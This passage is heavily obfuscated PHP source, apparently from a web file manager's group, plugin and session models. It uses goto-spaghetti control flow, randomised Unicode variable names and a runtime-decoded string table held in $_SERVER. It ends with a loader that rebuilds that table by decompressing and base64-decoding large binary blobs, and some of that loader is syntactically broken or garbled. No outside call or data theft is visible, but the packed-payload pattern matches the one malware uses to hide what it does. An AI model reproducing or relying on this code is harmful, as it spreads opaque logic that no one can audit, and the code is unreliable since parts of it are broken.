$this->getInfoSimple($Cά[$f⍧[457]]); if (!$b۬) { return !1; } } $a = $f⍧[2076]; goto aܣ; D: } protected function groupEdit($cƉ, $aǨː) { $C߾ =& $_SERVER[놫Ӱ]; if (!empty($aǨː[$C߾[457]])) { $b = $this->getInfoSimple($cƉ); $cℷ = $this->getInfoSimple($aǨː[$C߾[457]]); if (!$b || !$cℷ) { return !1; } if ($aǨː[$C߾[457]] != $b[$C߾[457]]) { if ($cℷ[$C߾[455]] !== $b[$C߾[455]] && strpos($cℷ[$C߾[455]], $b[$C߾[455]]) === 0) { return !1; } $aǨː[$C߾[518]] = $cℷ[$C߾[455]] . $aǨː[$C߾[457]] . $C߾[47]; $this->_changeChildLevel($b, $cℷ); } } if (isset($aǨː[$C߾[28]])) { $this->setNamePinyin($cƉ, $aǨː[$C߾[28]]); } return $this->where(array($C߾[2079] => $cƉ))->save($aǨː); } private function _changeChildLevel($a쎇ƫ, $AÄג, $B = false) { goto b; f鋊ũ: $this->where($Dհ󅫕)->data($Bǆ)->save(); goto bǩα; b: if ($B) { $E = $AÄג[$D֬[455]] . $AÄג[$D֬[2002]] . $D֬[47]; } $Dհ󅫕 = array($D֬[518] => array($D֬[475], $a쎇ƫ[$D֬[455]] . $a쎇ƫ[$D֬[2002]] . $D֬[476])); $Bǆ = array($D֬[518] => array($D֬[526], "\162\x65\x70\154\x61\x63\145\50\x70\x61\x72\x65\156\164\x4c\145\166\x65\154\x2c\47{$cڃ}\47\54\x27{$E}\x27\51")); goto f鋊ũ; b: $D֬ =& $_SERVER[놫Ӱ]; $cڃ = $a쎇ƫ[$D֬[455]] . $a쎇ƫ[$D֬[2002]] . $D֬[47]; $E = $AÄג[$D֬[455]] . $AÄג[$D֬[2002]] . $D֬[47] . $a쎇ƫ[$D֬[2002]] . $D֬[47]; goto b; bǩα: } public function setNamePinyin($cá, $Cܸ = false) { $c䛟 =& $_SERVER[놫Ӱ]; if (!$Cܸ) { $E䂺 = $this->getInfoSimple($cá); $Cܸ = $E䂺[$c䛟[28]]; } if (!Input::check($Cܸ, $c䛟[520])) { $this->metaSet($cá, $c䛟[412], null); $this->metaSet($cá, $c䛟[411], null); return; } $F̗ = array($c䛟[412] => str_replace($c䛟[50], $c䛟[33], Pinyin::encode($Cܸ)), $c䛟[411] => Pinyin::encode($Cܸ, $c䛟[521])); $this->metaSet($cá, $F̗); } protected function groupRemove($b) { goto Bɓ; A: if (!$dޮ || $dޮ[$Fʄǔ[457]] == 0) { return !1; } $Cƛ = $this->getInfoSimple($dޮ[$Fʄǔ[457]]); $this->_changeChildLevel($dޮ, $Cƛ, !0); goto E; E: $this->where(array($Fʄǔ[457] => $b))->save(array($Fʄǔ[457] => $dޮ[$Fʄǔ[457]])); Model($Fʄǔ[2080])->where($Aң)->delete(); Model($Fʄǔ[2081])->where($Aң)->delete(); goto B; B: Model($Fʄǔ[747])->groupRootRemove($b); return $this->where($Aң)->delete(); goto f󼾍; Bɓ: $Fʄǔ =& $_SERVER[놫Ӱ]; $Aң = array($Fʄǔ[2002] => $b); $dޮ = $this->where($Aң)->find(); goto A; f󼾍: } public function listData() { $EԼ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($EԼ[$_SERVER[놫Ӱ][350]]); return $EԼ; } private function _makeOrder($C = '') { goto fڋ; Aȱ: $cػ = Input::get($f搷[403], $f搷[7], $f搷[2079], $B); $D = Input::get($f搷[404], $f搷[7], $f搷[2082], array($f搷[2082], $f搷[400])); $D = $Bㇰ[$D]; goto b; b: $C = $C . "{$cػ}\40{$D}\54\x20\147\162\x6f\165\160\x49\x44\40\141\163\x63"; return $this->order($C); goto d٢; fڋ: $f搷 =& $_SERVER[놫Ӱ]; $B = array($f搷[2002], $f搷[28], $f搷[1988], $f搷[184]); $Bㇰ = array($f搷[398] => $f搷[399], $f搷[400] => $f搷[401]); goto Aȱ; d٢: } public function listChild($B) { $F =& $_SERVER[놫Ӱ]; $cꪳ = $this->where(array($F[457] => $B))->_makeOrder()->selectPage(200); $this->_listDataApply($cꪳ[$F[350]]); return $cꪳ; } public function listByID($Aֶф) { $Aъ݂ =& $_SERVER[놫Ӱ]; if (!$Aֶф) { return array(); } $f󣈳 = array($Aъ݂[2002] => array($Aъ݂[7], $Aֶф)); $AՂ = $this->where($f󣈳)->select(); $this->_listDataApply($AՂ); return $AՂ; } public function listSearch($E) { goto cۊ; bྋ: $this->_listDataApply($Aŋ[$C܈[350]]); return $Aŋ; goto E뗡º; cۊ: $C܈ =& $_SERVER[놫Ӱ]; $FՐ = $E[$C܈[2083]]; $D񗗗 = isset($E[$C܈[2084]]) ? $E[$C܈[2084]] : !1; goto D; D: if (!trim($FՐ)) { return !1; } $FՐ = str_replace($C܈[2085], $C܈[2086], $FՐ); $dڕˉ = array($C܈[2002] => array($C܈[746], "\45{$FՐ}\45"), $C܈[28] => array($C܈[746], "\45{$FՐ}\45"), $C܈[907] => $C܈[2087]); goto e; e: $Aŋ = $this->_makeOrder()->where($dڕˉ)->selectPage(20); $Aŋ = $Aŋ ? $Aŋ : array(); if (!$Aŋ || count($Aŋ[$C܈[350]]) < 5 && Input::check($FՐ, $C܈[303])) { $a = $this->_searchFromMeta($C܈[411], $FՐ, 10); $d挑ʬ = $this->_searchFromMeta($C܈[412], $FՐ, 10); $Eͅ񵤠 = array_merge($a, $d挑ʬ, $Aŋ[$C܈[350]]); $Aŋ[$C܈[350]] = array_unique_by_key($Eͅ񵤠, $C܈[2002]); $Aŋ[$C܈[347]][$C܈[348]] = count($Aŋ[$C܈[350]]); $Aŋ[$C܈[347]][$C܈[349]] = ceil($Aŋ[$C܈[347]][$C܈[348]] / $Aŋ[$C܈[347]][$C܈[345]]); } goto bྋ; E뗡º: } private function _searchFromMeta($B, $Č, $f) { goto dҋҒ; dҋҒ: $E =& $_SERVER[놫Ӱ]; $Č = strtolower($Č); $Cƣꅈ = array($E[88] => $B, $E[354] => array($E[746], "\x25{$Č}\x25")); goto BƉ; fݣ֔: $e梱 = $this->where(array($E[2079] => array($E[7], $E)))->select(); if (!$e梱) { return array(); } return $e梱; goto D; BƉ: $E = Model($E[2088])->where($Cƣꅈ)->limit($f)->select(); if (!$E) { return array(); } $E = array_to_keyvalue($E, $E[33], $E[2002]); goto fݣ֔; D: } protected function _listDataApplyItem($C) { $FƄ = array($C); $this->_listDataApply($FƄ); return $FƄ[0]; } protected function _listDataApply(&$BƔ) { goto e圖; bɱ: $this->_listAppendParent($BƔ); $this->_listAppendSourceRoot($BƔ, $A̸); goto Dȣ; e圖: $e۪ =& $_SERVER[놫Ӱ]; if (!$BƔ) { return; } $A̸ = array_to_keyvalue($BƔ, $e۪[33], $e۪[2002]); goto C͸; C͸: $this->_listAppendChildren($BƔ); $this->_listAppendChildrenMember($BƔ); $this->_listAppendMeta($BƔ, $A̸); goto bɱ; Dȣ: } private function _listAppendChildren(&$e) { goto bњ؋; eҐ: $E١ = count($e); $Eшǲ = $this->tablePrefix . $this->tableName; for ($bƄ = 0, $Eь = 0; $bƄ < $E١; $bƄ++) { $Eь++; $fΧ = $e[$bƄ][$Dф[2002]]; $C .= "\x53\x45\x4c\x45\103\124\x20\52\40\106\x52\x4f\x4d\x20\50\x53\105\x4c\x45\103\x54\x20\47{$fΧ}\137\x63\x68\151\154\144\47\x20\141\163\x20\x68\x61\x73\40\106\122\x4f\115\x20\x60{$Eшǲ}\140\40\167\x68\145\162\x65\40\x70\141\x72\x65\x6e\164\111\104\x3d{$fΧ}\40\x6c\x69\x6d\151\x74\x20\x31\51\40\x61\163\40\x74\x62\137{$fΧ}\40\165\156\x69\x6f\156\40\x61\154\x6c\40"; if (($Eь >= 20 || $bƄ == $E١ - 1) && $C) { $C = substr($C, 0, -strlen($Dф[445])); $d = $this->query($C); $eǠ = array_merge($eǠ, $d); $Eь = 0; $C = $Dф[33]; } } goto EÅ; bњ؋: $Dф =& $_SERVER[놫Ӱ]; $C = $Dф[358]; $eǠ = array(); goto eҐ; EÅ: $eǠ = array_to_keyvalue($eǠ, $Dф[446]); foreach ($e as &$D) { $D[$Dф[2089]] = isset($eǠ[$D[$Dф[2002]] . $Dф[2090]]); } goto b; b: } private function _listAppendChildrenMember(&$f) { goto BȔ; BȔ: $Dș =& $_SERVER[놫Ӱ]; $Eӆ˳ = $Dș[358]; $D먇 = array(); goto f; B׎: $D먇 = array_to_keyvalue($D먇, $Dș[446]); foreach ($f as &$F൧) { $F൧[$Dș[2091]] = isset($D먇[$F൧[$Dș[2002]] . $Dș[2090]]); } goto f۷; f: $BΉ﹢ = count($f); $cݍ = $this->tablePrefix . $Dș[2081]; for ($bи = 0, $B쏇 = 0; $bи < $BΉ﹢; $bи++) { $B쏇++; $Eԓ = $f[$bи][$Dș[2002]]; $Eӆ˳ .= "\x53\105\114\x45\x43\124\40\52\40\106\x52\117\115\x20\50\x53\105\x4c\105\103\124\40\x27{$Eԓ}\x5f\x63\150\x69\154\144\47\x20\141\163\40\150\x61\x73\x20\x46\x52\117\x4d\40\140{$cݍ}\140\40\x77\150\x65\x72\145\x20\147\162\157\165\x70\111\104\75{$Eԓ}\40\154\151\x6d\151\x74\40\61\51\x20\141\x73\x20\164\x62\x5f{$Eԓ}\40\x75\x6e\151\157\x6e\40\x61\154\x6c\40"; if (($B쏇 >= 20 || $bи == $BΉ﹢ - 1) && $Eӆ˳) { $Eӆ˳ = substr($Eӆ˳, 0, -strlen($Dș[445])); $E̊Í = $this->query($Eӆ˳); $D먇 = array_merge($D먇, $E̊Í); $B쏇 = 0; $Eӆ˳ = $Dș[33]; } } goto B׎; f۷: } private function _listAppendMeta(&$eѩ, $E첚ֺ) { $DϷΉ =& $_SERVER[놫Ӱ]; $Dĺ = array($DϷΉ[2002] => array($DϷΉ[7], $E첚ֺ)); $eɛ = Model($DϷΉ[2080])->where($Dĺ)->select(); $eɛ = array_to_keyvalue_group($eɛ, $DϷΉ[2002]); foreach ($eɛ as &$FȎ) { $FȎ = array_to_keyvalue($FȎ, $DϷΉ[88], $DϷΉ[354]); } foreach ($eѩ as &$Eǥ۴) { $Eǥ۴[$DϷΉ[413]] = array(); if (isset($eɛ[$Eǥ۴[$DϷΉ[2002]]])) { $Eǥ۴[$DϷΉ[413]] = $eɛ[$Eǥ۴[$DϷΉ[2002]]]; } } } protected function parentLevelArray($dԼ׊) { $FĂϋ =& $_SERVER[놫Ӱ]; $dԼ׊ = explode($FĂϋ[47], trim($dԼ׊, $FĂϋ[47])); $dԼ׊ = array_remove_value($dԼ׊, $FĂϋ[464]); return $dԼ׊; } private function _listAppendParent(&$Cቚ) { goto e; e: $Bĺ =& $_SERVER[놫Ӱ]; $E = array(); foreach ($Cቚ as &$B) { $E[$B[$Bĺ[2002]]] = $B[$Bĺ[28]]; $F = $this->parentLevelArray($B[$Bĺ[455]]); foreach ($F as $A̼ꦏ) { if (!isset($E[$A̼ꦏ])) { $E[$A̼ꦏ] = 0; } } } goto b; F滢ϑ: foreach ($Cቚ as &$B) { $F = $this->parentLevelArray($B[$Bĺ[455]]); $E߇ = $Bĺ[33]; foreach ($F as $A̼ꦏ) { $E߇ .= $E[$A̼ꦏ] . $Bĺ[8]; } if ($F) { $E߇ .= $B[$Bĺ[28]]; } $B[$Bĺ[459]] = str_replace($Bĺ[463], $Bĺ[8], $E߇); } goto b; b: $f笇 = array(); foreach ($E as $D => $c) { if (!$c) { $f笇[] = $D; } } if ($f笇) { $E̵ = array($Bĺ[2079] => array($Bĺ[381], $f笇)); $Cիܽ = $this->field($Bĺ[2092])->where($E̵)->select(); $bʄ = array_to_keyvalue($Cիܽ, $Bĺ[2002], $Bĺ[28]); $E = array_merge_index($E, $bʄ); } goto F滢ϑ; b: } private function _listAppendSourceRoot(&$dǅ, $dᡫį) { goto aٝ; bƾ㹌: foreach ($dǅ as &$B) { $B[$dִ݄[388]] = $F[$B[$dִ݄[2002]]] ? $F[$B[$dִ݄[2002]]] : array(); } goto a돲; aٝ: $dִ݄ =& $_SERVER[놫Ӱ]; $E = array($dִ݄[368] => SourceModel::TYPE_GROUP, $dִ݄[457] => 0, $dִ݄[452] => array($dִ݄[7], $dᡫį)); $c = $dִ݄[2093]; goto F; F: $F = Model($dִ݄[747])->order($dִ݄[2094])->field($c)->where($E)->select(); $F = array_to_keyvalue($F, $dִ݄[452]); $F = array_remove_key($F, $dִ݄[452]); goto bƾ㹌; a돲: } protected function resetParentLevel() { $EЭ =& $_SERVER[놫Ӱ]; $eי = $EЭ[2002]; $Cɯ = $this->select(); $Cɯ = array_to_keyvalue($Cɯ, $eי); foreach ($Cɯ as $Aۉ) { goto b; aܲ: $this->where(array($eי => $Aۉ[$eי]))->save(array($EЭ[518] => $Dأ٠)); goto E; aȢ: $Dأ٠[] = 0; $Dأ٠ = $EЭ[47] . implode($EЭ[47], array_reverse($Dأ٠)) . $EЭ[47]; $this->setNamePinyin($Aۉ[$eי], $Aۉ[$EЭ[28]]); goto aܲ; b: $BС = $Aۉ; $Dأ٠ = array(); while ($BС[$EЭ[457]] != 0) { $Dأ٠[] = $BС[$EЭ[457]]; $BС = $Cɯ[$BС[$EЭ[457]]]; } goto aȢ; E: } return $Cɯ; } public function groupNameAuto($aҬ, $E埭) { $dמ =& $_SERVER[놫Ӱ]; $eŉ = $this->where(array($dמ[365] => $aҬ))->getField($dמ[28], !0); if (!$eŉ || !in_array($E埭, $eŉ)) { return $E埭; } for ($cˈ = 1; $cˈ <= count($eŉ) + 1; $cˈ++) { $bǌ = $E埭 . "\50{$cˈ}\x29"; if (!in_array($bǌ, $eŉ)) { return $bǌ; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\x2e\160\x6c\x75\x67\151\156\114\151\x73\x74"; public $field = array("\x6e\141\155\x65", "\x73\x74\141\x74\165\x73", "\x72\145\x67\x69\x65\x73\x74", "\x63\x6f\x6e\146\x69\x67"); public function loadList($D = false) { $a = array_to_keyvalue($this->listData(), $_SERVER[놫Ӱ][28]); if ($D) { return $a[$D]; } return $a; } public function init() { $Bፑ =& $_SERVER[놫Ӱ]; Hook::trigger($Bፑ[2095]); $eܬ = $this->loadPluginList(); foreach ($eܬ as $C => $A) { $C᝛ = $this->appAllow($C, $A); if (!$C᝛) { continue; } foreach ($A[$Bፑ[2096]] as $fƎϖ => $cʏ) { Hook::bind($fƎϖ, $cʏ); } } Hook::trigger($Bፑ[2097]); Hook::trigger(ACTION); } public function appAllow($c˕, $eڛ, $F = true) { $E֛ =& $_SERVER[놫Ӱ]; $B䛶 = PLUGIN_DIR . $c˕ . $E֛[2098]; if (!is_array($eڛ) || !is_array($eڛ[$E֛[2096]]) || !is_file($B䛶) || $eڛ[$E֛[674]] != 1) { return !1; } if ($F && !Action($E֛[2099])->checkAuth($c˕)) { return !1; } return !0; } public function unInstall($fȯ) { $e挤 =& $_SERVER[놫Ӱ]; $A몓 = $this->loadList($fȯ); if (file_exists(PLUGIN_DIR . $fȯ)) { Hook::apply($fȯ . $e挤[2100]); } $this->remove($A몓[$e挤[364]]); } public function changeStatus($BŐ, $Fӊ݉) { $F =& $_SERVER[놫Ӱ]; $D = $this->loadList($BŐ); if ($Fӊ݉) { Hook::apply($BŐ . $F[2101]); } $this->update($D[$F[364]], array($F[2102] => $Fӊ݉)); } public function appRegist($b, $A) { $fް =& $_SERVER[놫Ӱ]; $F = $this->loadList($b); if ($F) { $this->update($F[$fް[364]], array($fް[2096] => $A)); } else { $E򭍜 = array($fް[28] => $b, $fް[2096] => $A, $fް[674] => 0, $fް[6] => $this->getConfigDefault($b)); $this->insert($E򭍜); } } public function getConfigDefault($a㦨) { $Fյ⌅ =& $_SERVER[놫Ӱ]; $eӯƊۜ = array(); $e = $this->getPackageJson($a㦨); if (!$e && is_array($e[$Fյ⌅[2103]])) { return $eӯƊۜ; } foreach ($e[$Fյ⌅[2103]] as $bƙ => $A¶) { if (!isset($A¶[$Fյ⌅[354]]) || isset($eӯƊۜ[$bƙ])) { continue; } $eӯƊۜ[$bƙ] = $A¶[$Fյ⌅[354]]; } return $eӯƊۜ; } public function getPackageJson($b¶) { return Hook::apply($b¶ . $_SERVER[놫Ӱ][2104]); } public function getConfig($fɍ, $aȡ = false) { $a凃 =& $_SERVER[놫Ӱ]; $A = array(); $fۯ = $this->loadList($fɍ); if ($fۯ && is_array($fۯ[$a凃[6]])) { $A = $fۯ[$a凃[6]]; } if (!$A || $aȡ) { $A = $this->getConfigDefault($fɍ); } return $A; } public function setConfig($b, $AԺ = false) { goto B騿۶; C: $this->update($a[$b[364]], array($b[6] => $Eٹ)); goto D䡢̰; B騿۶: $b =& $_SERVER[놫Ӱ]; $a = $this->loadList($b); if (!$a) { return !1; } goto dء; dء: if ($AԺ == !1) { $AԺ = $this->getConfigDefault($b); } $Eٹ = $a[$b[6]]; foreach ($AԺ as $b݆ => $AǾ꼋) { $Eٹ[$b݆] = is_string($AǾ꼋) ? trim($AǾ꼋) : $AǾ꼋; } goto C; D䡢̰: } public function viewList() { goto d윍ԥ; d윍ԥ: $eޝ =& $_SERVER[놫Ӱ]; $d = $this->loadList(); $this->pluginScan($d); goto f־; d: return $C؏; goto ēċ; f־: $d = $this->loadPluginList(); $C؏ = array(); foreach ($d as $aѣ => $B㦉׵) { unset($B㦉׵[$eޝ[2096]], $B㦉׵[$eޝ[6]]); $F޼ = PLUGIN_DIR . $B㦉׵[$eޝ[28]] . $eޝ[2098]; if (!is_file($F޼)) { continue; } $Eؒ = Hook::apply($B㦉׵[$eޝ[28]] . $eޝ[2104]); if (is_array($Eؒ)) { $C؏[$aѣ] = array_merge($B㦉׵, $Eؒ); } } goto d; ēċ: } private function loadPluginList() { $f㔪ܞ =& $_SERVER[놫Ӱ]; $c = $this->loadList(); if (strtolower(MOD) == $f㔪ܞ[2105]) { $dƆ̙٫ = $c; } else { $dƆ̙٫ = Hook::trigger($f㔪ܞ[2106], $c); if (!$dƆ̙٫) { die; } } return $dƆ̙٫; } private function pluginScan($fׂ) { $EѲ =& $_SERVER[놫Ӱ]; recursion_dir(PLUGIN_DIR, $C, $AÏ, 0); foreach ($C as $eͅ鰌) { $b = get_path_this($eͅ鰌); if (isset($fׂ[$b]) || !file_exists($eͅ鰌 . $EѲ[2107]) || !file_exists($eͅ鰌 . $EѲ[2098])) { continue; } Hook::apply($b . $EѲ[2101]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\x6d\137\163\x65\x73\163\151\157\156"; public function get($E͜) { $Eϰ =& $_SERVER[놫Ӱ]; $Eդ = $this->where(array($Eϰ[2108] => $E͜))->find(); if (!is_array($Eդ)) { return !1; } return $Eդ[$Eϰ[677]]; } public function set($c, $A, $d̽ = 3600) { $E⦼ =& $_SERVER[놫Ӱ]; $cӛ = array($E⦼[2108] => $c, $E⦼[2033] => $A, $E⦼[2109] => $d̽ + time()); if (Session::get($E⦼[2110])) { $cӛ[$E⦼[1339]] = Session::get($E⦼[2110]); } else { $cӛ[$E⦼[1339]] = 0; } if ($this->get($c)) { return $this->where(array($E⦼[2108] => $c))->save($cӛ); } else { return $this->add($cӛ, array(), !0); } } public function remove($Eεň) { return $this->where(array($_SERVER[놫Ӱ][2108] => $Eεň))->delete(); } public function clearTimeout() { return $this->where($_SERVER[놫Ӱ][2111] . time())->delete(); } } goto f禷; b̯: function beforeShutdownError($Dƒ = false, $B鎞 = '', $B = '', $Fॾ = 0) { $e˺ =& $_SERVER[]; switch ($Dƒ) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $d = $e˺[36]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $d = $e˺[37]; break; case E_STRICT: $d = $e˺[38]; break; case E_NOTICE: case E_USER_NOTICE: $d = $e˺[39]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $d = $e˺[40]; break; default: break; } if (!$d || $d == $e˺[39] || $d == $e˺[40]) { return; } $B = $e˺[2] . str_replace($_SERVER[$e˺[34]], $e˺[18], $B); $c݂ = $d . $e˺[41] . $B鎞 . $e˺[41] . $B . $e˺[41] . $Fॾ; write_log($c݂ . $e˺[16] . get_caller_msg(), $e˺[17]); } $_SERVER[$_SERVER[][42]] = $_SERVER[$_SERVER[][34]] . $_SERVER[][43]; $c͛ט = strrev(base64_decode($_SERVER[][44])); goto Dل; FƗ: if (!function_exists('_kodDe')) { function _kodDe($dǲ븗) { $dǲ븗 = base64_decode($dǲ븗); $dˈ = strlen($dǲ븗); $E = ''; $A睯 = ord($dǲ븗[0]) - 30; for ($D惼 = 1; $D惼 < $dˈ; $D惼 += 2) { if ($D惼 + 1 < $dˈ) { $E .= chr(ord($dǲ븗[$D惼 + 1]) + $A睯); $E .= chr(ord($dǲ븗[$D惼]) + $A睯); } else { $E .= chr(ord($dǲ븗[$D惼]) + $A睯); } } return $E; } } define("\370\346\273\353\206\253\323\260\300\325", "\314\231\257\364\203\224\277"); $_SERVER[놫Ӱ] = explode("\174\3\174\2\174\4", gzinflate(substr(strrev('VVXI	-l؜_$8Gr0`	}'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'').base64_decode('Xcmyk5T7DlCucEOhpVCulCMchSSFQrjK0XIVaClNkwApoYXenP/cMyvJQP8WRztv3txv3ryZeQ==')."\xef\xcd\x7f\xd7\x7c\x6b\xcd\x5e\x6b\xbe\xfd\xec\xe5\xf8\x17\xfc\x7f\xcf\x35\x7b\xe3\xef\x13\x2e\xd8\x6f\xf\xf4\xbf\x6f\x65\x4f\x7e\xcc\xb7\x57\xe3\x21\x17\x9e\xb7\xf2\xb3\x3\x7c\x37\x7c\x77\xea\xdb\xf3\x4e\xfd\xd1\x9d"."\47\257\177\350\230\243\326\171\103\157\235\226\255\315\276\134\234\322\270\346\321\231\315\317\335\175\366\163\57\254\176\143\274\371\257\205\337\375\351\343\374\350\103\23\367\34\326\362\370\236\353\333\217\274\365"."\x8e\xb\x9b\xce\x3d\xea\xb8\x5f\x5f\xff\x97\x47\x7e\x7b\xe2\x1b\x1b\x77\x4d\xc9\x74\xef\xf7\x7c\x67\xfa\xad\x33\x67\xfd\x66\xf0\xae\xc7\xe\xfe\xe2\xee\x4f\x5e\x1f\x18\x3f\xfa\x35\xf9\xd3\x1f\x6d\x1d\x91\xdf\xd9\xf4\xcf"."\375\76\132\175\206\332\363\361\36\233\67\254\73\263\355\363\35\35\213\366\173\370\17\247\337\264\76\160\372\153\337\375\227\364\303\177\137\263\166\343\173\257\357\373\121\123\367\275\207\277\172\120\346\210\272".base64_decode('KU/89qQnLn750f1n7HnJ9kumPJvUHrvhXuuFndoLP33uzImFSrYtoR5xy+c3r/vzyet/f9+TtQ==').strrev('Vc}aR^//SHW1!]5[okGkox7')."\277\42\373\160\346\340\277\155\266\174\277\337\264\367\312\73\317\36\352\373\351\346\77\105\116\277\350\236\75\356\371\301\300\236\316\372\221\145\317\134\170\347\213\153\175\346\272\127\16\175\340\230\303\46\56"."\271\353\212\147\157\70\154\257\77\36\261\371\201\357\264\173\117\331\343\304\33\152\76\330\270\327\36\173\340\276\155\305\77\122\116\267\44\265\244\231\226\211\1\161\75\227\324\122\370\133\313\341\137\27\376"."\x31\x47\x33\x9a\xa5\xe2\xef\xa8\xcf\x1f\x8e\x86\xfa\x3\x1\x4f\x30\x1c\x25\x39\x8a\xf1\x59\x3d\x41\xbe\xf2\x8a\xa1\x64\x49\xe6\x79\xd5\x30\x41\x51\x62\x76\xd1\xbc\x9e\x57\x73\x36\x8\x7\x24\x14\x4b\x89\x29\x26\xc9\xa9"."\xab\x23\xda\xe5\x9\xf4\xfa\x97\x47\xc3\xcb\x3\x1e\x82\x11\x8b\x8e\x16\x54\x63\x1c\x87\xd0\x67\xc8\x52\xc\x2b\xac\x65\x55\x86\x31\x66\xb0\x7a\x75\x78\x16\x7b\x7d\x52\x38\xe8\xf6\x85\xdc\x9d\x61\xaf\xdf\x87\xc1\x9d\xfe"."\xbe\x3e\x6f\xb8\x12\x1e\xf4\xf7\xf6\x76\xb8\x3b\x97\x54\xc6\x4\x82\xee\xc5\x7d\x6e\x9\xd4\x2f\xa3\x46\xb5\x5c\x52\xaf\x95\x56\xe1\x98\x55\x52\x1d\xfe\xe8\xd6\xd4\x4c\x2\x7f\xe6\x14\x5a\x1d\x6b\x3c\x4f\xbe\xc2\xec\xb"."\214\101\256\220\311\340\200\217\175\221\372\253\111\245\220\41\175\326\45\6\362\206\226\125\150\323\227\250\343\14\212\77\224\202\245\153\271\70\16\170\112\226\241\160\70\250\161\334\120\263\152\216\144\25\362"."\364\172\72\303\22\254\246\324\35\364\367\111\144\50\262\212\151\251\206\64\320\343\11\172\44\130\365\266\31\250\305\63\44\234\256\337\7\72\104\162\367\366\112\223\345\140\251\331\74\315\6\247\251\222\231"."\77\330\345\11\112\35\313\45\336\117\161\75\233\325\163\116\220\13\30\117\113\250\252\47\30\304\37\62\241\340\136\57\34\72\22\360\167\167\207\74\54\104\32\167\162\57\250\111\63\241\122\133\50\221\314"."\x58\xd1\xa2\x92\x29\x50\x62\x1d\xc1\xbf\x33\xc8\xf\xf9\xd5\x4d\x42\xc0\xa3\x5a\x4e\x2b\x10\x62\x25\x59\xe8\xba\x49\x49\xde\x64\x73\x88\x7c\xa8\xf4\x23\xc7\x90\x40\x6\x3a\x99\x5d\x60\xaa\x15\xf1\x67\x5b\x3b\xfe\x9d\x4f"."\220\142\121\30\247\32\126\124\315\305\365\204\226\43\23\162\41\231\174\204\4\25\53\335\145\150\0\217\144\250\73\343\172\176\274\117\57\222\326\44\265\214\332\313\346\133\122\317\44\124\203\207\363\40\271"."\30\103\232\245\115\10\251\175\205\254\210\302\202\361\264\226\111\30\164\232\176\25\246\251\132\26\250\277\111\253\330\237\317\350\112\42\244\32\254\332\5\4\351\326\215\154\27\230\356\244\7\0\221\153\375"."\125\42\106\50\231\47\204\206\343\34\350\120\165\246\13\271\221\20\153\206\223\360\260\332\301\323\34\137\14\15\56\2\377\324\21\206\26\41\125\114\253\231\114\124\55\251\144\256\144\23\263\114\132\175\227".base64_decode('GdNyLgDBQa8/mlbMdF9iVhSlonwyoZac+XSeDDabwYSIYU/7dMsjsNmMHlcIUtqy8iE1l+gGvQ==')."\110\332\246\217\345\120\57\345\125\225\64\253\113\226\22\122\237\264\134\352\151\325\132\31\301\45\264\344\70\347\164\151\53\313\262\244\275\317\141\46\3\132\45\102\1\65\44\254\226\54\322\43\322\374\170"."\132\61\300\230\265\25\254\244\143\56\141\30\371\174\106\213\53\226\246\347\134\172\334\122\55\207\151\31\252\102\162\253\231\57\301\361\207\63\267\36\247\242\263\246\123\317\131\140\332\72\302\206\222\63\223"."\xaa\xe1\xf0\x10\x62\x6e\x95\x40\xa7\x32\xce\x45\xd1\xba\x34\x33\xaf\x9b\x1a\x2c\xa6\x55\x52\x2c\x4b\x89\xa7\xe1\xac\xe7\xd9\xb7\x7d\x5\xbe\x96\xcb\x68\x39\xb5\x2\xd7\x1d\x8f\xab\xa6\xe9\x80\x49\xc\x3d\xe3\x70\x67\x32".base64_decode('+pjDb2gpDaSpL6sm4EitEmWXec1QTRqUFveFCTKoleoIGEoqq7RK+UIM9AyZjVVgGJuU3irFYQ==').base64_decode('UJayBdNyGCpgOxpY4MjgeZOOPjiemppwhAB3JuDmhhYJkI5E4zC0JxwORL3dYBH2eaJ97nBnDw==').base64_decode('qbalpGidewHPZVlS4DKHv2BBQvOBPuLAgD6mGqDgjvFWaURPxPSSk0ZBZDiZKDLs0bzlCCq5FA==')."\xec\x9f\xd8\xb8\xa5\x9a\x74\xd\x9\x2e\xf5\x4\xa3\x21\x7f\x77\x78\xc0\x1d\x24\xeb\x73\xe\xf4\x74\x89\xe6\x5\xd3\x66\x1c\x41\x35\x1\xfa\x36\x6e\xd1\x1c\x95\x3c\xec\x16\x8a\x3\x67\x2\x1c\x44\x1a\xb\x67\x7\x8d\xeb".base64_decode('9S6GLe9ymADJIWLRvHu1rAYrZ7EY1FVg8V5MKuRCNW6LpOtrI4mZdQ7wb33dYKTLWT+00KXxNA==')."\xae\x46\x67\xa3\xd4\xd4\x30\x5b\xa\x0\x69\x42\x53\x32\x12\x21\x93\xa\x8c\x6\xc9\xbf\xc4\x4e\x48\xbd\x6a\x2e\x65\xa5\x89\x80\x15\xf4\x9c\xdc\xef\x9\x85\xa3\x7d\x9e\x70\x8f\xbf\x8b\xa4\xf6\xb8\xbb\x78\xeb\x5a\x5d\x2e".base64_decode('HjBZqFfHU442ZBD/DJGRAUt/So3rGd1QMpCZUDpS6eROaUnOnb1AQCGFYPbFAyEtm6eMx0oXsg==').base64_decode('MeHTxXMgTASMFGM3OltJdIN8sdpPa+qmHNMVagb/cfaY0LMKlSzRhFQTeEZiUL0tpkdV+NJkGQ==').base64_decode('lg6hhg2lT7XSOpkYKZVWqcDqRmuZUDMq7aW0StcLIC4VWeflDTWpEXIF8hGAc+6qmUGQCMorNA==').strrev('MC